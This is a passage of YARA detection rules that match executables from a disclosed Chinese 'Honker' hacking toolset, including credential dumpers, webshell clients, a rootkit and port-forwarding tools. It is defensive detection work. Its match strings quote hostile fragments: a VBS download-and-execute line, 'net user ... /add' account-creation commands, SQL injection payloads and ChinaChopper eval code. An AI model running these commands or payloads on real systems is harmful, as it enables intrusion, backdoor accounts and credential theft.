      description = "Sample from CN Honker Pentest Toolset - file Oracle.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:21:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "!http://localhost/index.asp?id=zhr" fullword ascii
      $s2 = "OnGetPassword" fullword ascii
      $s3 = "Mozilla/3.0 (compatible; Indy Library)" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3455KB and all of them
} 

rule CN_Honker_Interception_RID2FBB : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Interception.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:09:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = ".\\dat\\Hookmsgina.dll" fullword ascii
      $s5 = "WinlogonHackEx " fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 160KB and all of them
} 

rule CN_Honker_sig_3389_DUBrute_v3_0_RC3_3_0_RID3419 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file 3.0.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:16:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "explorer.exe http://bbs.yesmybi.net" fullword ascii
      $s1 = "LOADER ERROR" fullword ascii
      $s9 = "CryptGenRandom" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 395KB and all of them
} 

rule CN_Honker_windows_exp_RID2F7E : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file exp.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:59:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "c:\\windows\\system32\\command.com /c " fullword ascii
      $s8 = "OH,Sry.Too long command." fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and all of them
} 

rule CN_Honker_safe3wvs_cgiscan_RID3130 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file cgiscan.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:11:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "httpclient.exe" fullword wide
      $s3 = "www.safe3.com.cn" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 357KB and all of them
} 

rule CN_Honker_pr_debug_RID2E0F : CHINA DEMO EXE FILE HKTL T1087 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file debug.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:58:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1087, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "-->Got WMI process Pid: %d " ascii
      $s2 = "This exploit will execute \"net user temp 123456 /add & net localg" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 820KB and all of them
} 

rule CN_Honker_T00ls_Lpk_Sethc_v4_0_RID31CE : CHINA DEMO EXE FILE HKTL T1015 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v4.0.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:38:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1015, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "LOADER ERROR" fullword ascii
      $s15 = "2011-2012 T00LS&RICES" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2077KB and all of them
} 

rule CN_Honker_MatriXay1073_RID2EC1 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file MatriXay1073.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:28:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1" ascii
      $s1 = "Policy\\Scan\\GetUserLen.ini" fullword ascii
      $s2 = "!YEL!Using http://127.0.0.1:%d/ to visiter https://%s:%d/" fullword ascii
      $s3 = "getalluserpasswordhash" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 9100KB and all of them
} 

rule CN_Honker_Sword1_5_RID2D9B : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Sword1.5.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:39:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "http://www.md5.com.cn" fullword wide
      $s2 = "ListBox_Command" fullword wide
      $s3 = "\\Set.ini" fullword wide
      $s4 = "OpenFileDialog1" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 740KB and all of them
} 

rule CN_Honker_Havij_Havij_RID2F0A : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Havij.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:40:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "User-Agent: %Inject_Here%" fullword wide
      $s2 = "BACKUP database master to disk='d:\\Inetpub\\wwwroot\\1.zip'" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them
} 

rule CN_Honker_exp_ms11011_RID2E47 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file ms11011.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:07:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\i386\\Hello.pdb" ascii
      $s1 = "OS not supported." fullword ascii
      $s2 = ".Rich5" fullword ascii
      $s3 = "Not supported." fullword wide
      $s5 = "cmd.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them
} 

rule CN_Honker_DLL_passive_privilege_escalation_ws2help_RID3AC9 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file ws2help.dll"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 20:01:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "PassMinDll.dll" fullword ascii
      $s1 = "\\ws2help.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them
} 

rule CN_Honker_Webshell_RID2DFD : CHINA DEMO EXE FILE HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Webshell.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:55:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Windows NT users: Please note that having the WinIce/SoftIce" fullword ascii
      $s2 = "Do you want to cancel the file download?" fullword ascii
      $s3 = "Downloading: %s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 381KB and all of them
} 

rule CN_Honker_AspxClient_RID2EC2 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file AspxClient.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:28:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\tools\\hashq\\hashq.exe" fullword wide
      $s2 = "\\Release\\CnCerT.CCdoor.Client.pdb" fullword ascii
      $s3 = "\\myshell.mdb" fullword wide
      $s4 = "injectfile" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 3 of them
} 

rule CN_Honker_Fckeditor_RID2E62 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Fckeditor.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:12:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "explorer.exe http://user.qzone.qq.com/568148075" fullword wide
      $s7 = "Fckeditor.exe" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1340KB and all of them
} 

rule CN_Honker_Codeeer_Explorer_RID312E : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Codeeer Explorer.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:11:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "Codeeer Explorer.exe" fullword wide
      $s12 = "webBrowser1_ProgressChanged" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 470KB and all of them
} 

rule CN_Honker_SwordHonkerEdition_RID3209 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file SwordHonkerEdition.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:48:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\bin\\systemini\\MyPort.ini" fullword wide
      $s1 = "PortThread=200 //" fullword wide
      $s2 = " Port Open -> " fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 375KB and all of them
} 

rule CN_Honker_HASH_PwDump7_RID2EDE : CHINA DEMO EXE FILE HKTL T1003 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file PwDump7.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:32:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%s\\SYSTEM32\\CONFIG\\SAM" fullword ascii
      $s2 = "No Users key!" fullword ascii
      $s3 = "NO PASSWORD*********************:" fullword ascii
      $s4 = "Unable to dump file %S" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 380KB and all of them
} 

rule CN_Honker_ChinaChopper_RID2F7B : CHINA DEMO EXE FILE HKTL T1100 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file ChinaChopper.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:59:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1100, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$u" wide
      $s3 = "SETP c:\\windows\\system32\\cmd.exe " fullword wide
      $s4 = "Ev al (\"Exe cute(\"\"On+Error+Resume+Next:%s:Response.Write(\"\"\"\"->|\"\"\"\"" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them
} 

rule CN_Honker_dedecms5_7_RID2E67 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file dedecms5.7.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:13:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "/data/admin/ver.txt" fullword ascii
      $s2 = "SkinH_EL.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 830KB and all of them
} 

rule CN_Honker_Alien_ee_RID2DD9 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file ee.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:49:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "GetIIS UserName and PassWord." fullword wide
      $s2 = "Read IIS ID For FreeHost." fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them
} 

rule CN_Honker_smsniff_smsniff_RID3112 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file smsniff.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:06:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "smsniff.exe" fullword wide
      $s5 = "SmartSniff" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 267KB and all of them
} 

rule CN_Honker_Happy_Happy_RID2F2A : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Happy.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:45:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<form.*?method=\"post\"[\\s\\S]*?</form>" fullword wide
      $s2 = "domainscan.exe" fullword wide
      $s3 = "http://www.happysec.com/" fullword wide
      $s4 = "cmdshell" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 655KB and 2 of them
} 

rule CN_Honker_T00ls_Lpk_Sethc_v3_0_RID31CD : CHINA DEMO EXE FILE HKTL T1015 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v3.0.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:38:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1015, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "http://127.0.0.1/1.exe" fullword wide
      $s2 = ":Rices  Forum:T00Ls.Net  [4 Fucker Te@m]" fullword wide
      $s3 = "SkinH_EL.dll" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them
} 

rule CN_Honker_NetFuke_NetFuke_RID308A : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file NetFuke.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:44:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Mac Flood: Flooding %dT %d p/s " fullword ascii
      $s2 = "netfuke_%s.txt" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1840KB and all of them
} 

rule CN_Honker_ManualInjection_RID30C8 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file ManualInjection.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:54:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "http://127.0.0.1/cookie.asp?fuck=" fullword ascii
      $s16 = "http://Www.cnhuker.com | http://www.0855.tv" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them
} 

rule CN_Honker_CnCerT_CCdoor_CMD_RID30B2 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file CnCerT.CCdoor.CMD.dll"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:50:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "CnCerT.CCdoor.CMD.dll" fullword wide
      $s3 = "cmdpath" fullword ascii
      $s4 = "Get4Bytes" fullword ascii
      $s5 = "ExcuteCmd" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 22KB and all of them
} 

rule CN_Honker_termsrvhack_RID2F71 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file termsrvhack.dll"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:57:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "The terminal server cannot issue a client license.  It was unable to issue the" wide
      $s6 = "%s\\%s\\%d\\%d" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1052KB and all of them
} 

rule CN_Honker_IIS6_iis6_RID2DBC : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file iis6.com"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:44:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "GetMod;ul" fullword ascii
      $s1 = "excjpb" fullword ascii
      $s2 = "LEAUT1" fullword ascii
      $s3 = "EnumProcessModules" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them
} 

rule CN_Honker_struts2_catbox_RID308E : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file catbox.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:44:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "'Toolmao box by gainover www.toolmao.com" fullword ascii
      $s20 = "{external.exeScript(_toolmao_bgscript[i],'javascript',false);}}" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 8160KB and all of them
} 

rule CN_Honker_getlsasrvaddr_RID303D : CHINA DEMO EXE FILE HKTL T1003 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file getlsasrvaddr.exe - WCE Amplia Security"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:31:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "pingme.txt" fullword ascii
      $s16 = ".\\lsasrv.pdb" fullword ascii
      $s20 = "Addresses Found: " fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them
} 

rule CN_Honker_ms10048_x64_RID2DE5 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file ms10048-x64.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:51:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[ ] Creating evil window" fullword ascii
      $s2 = "[+] Set to %d exploit half succeeded" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 125KB and all of them
} 

rule CN_Honker_LogCleaner_RID2EA3 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file LogCleaner.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:23:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s3 = ".exe <ip> [(path]" fullword ascii
      $s4 = "LogCleaner v" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them
} 

rule CN_Honker_shell_brute_tool_RID317D : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file shell_brute_tool.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:24:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "http://24hack.com/xyadmin.asp" fullword ascii
      $s1 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them
} 

rule CN_Honker_hxdef100_RID2D67 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file hxdef100.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:30:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "BACKDOORSHELL" fullword ascii
      $s15 = "%tmpdir%" fullword ascii
      $s16 = "%cmddir%" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them
} 

rule CN_Honker_Arp_EMP_v1_0_RID2EC0 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Arp EMP v1.0.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:27:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Arp EMP v1.0.exe" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them
} 

rule CN_Honker_GetWebShell_RID2EFD : CHINA DEMO EXE FILE HKTL T1077 T1087 T1100 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file GetWebShell.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:38:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1077, T1087, T1100, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo P.Open \"GET\",\"http://www.baidu.com/ma.exe\",0 >>run.vbs" fullword ascii
      $s5 = "http://127.0.0.1/sql.asp?id=1" fullword wide
      $s14 = "net user admin$ hack /add" fullword wide
      $s15 = ";Drop table [hack];create table [dbo].[hack] ([cmd] [image])--" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 70KB and 1 of them
} 

rule CN_Honker_Cracker_SHELL_RID2F59 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file SHELL.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:53:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "http://127.0.0.1/error1.asp" fullword ascii
      $s2 = "password,PASSWORD,pass,PASS,Lpass,lpass,Password" fullword wide
      $s3 = "\\SHELL" fullword wide
      $s4 = "WebBrowser1" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them
} 

rule CN_Honker_MSTSC_can_direct_copy_RID32D6 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file MSTSC_can_direct_copy.EXE"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:22:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "srv\\newclient\\lib\\win32\\obj\\i386\\mstsc.pdb" fullword ascii
      $s2 = "Clear Password" fullword wide
      $s3 = "/migrate -- migrates legacy connection files that were created with " fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them
} 

rule CN_Honker_lcx_lcx_RID2DB4 : CHINA DEMO EXE FILE HKTL T1020 T1090 T1136 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - HTRAN - file lcx.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:43:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1020, T1090, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%s -<listen|tran|slave> <option> [-log logfile]" fullword ascii
      $s2 = "=========== Code by lion & bkbll" ascii
      $s3 = "Welcome to [url]http://www.cnhonker.com[/url] " ascii
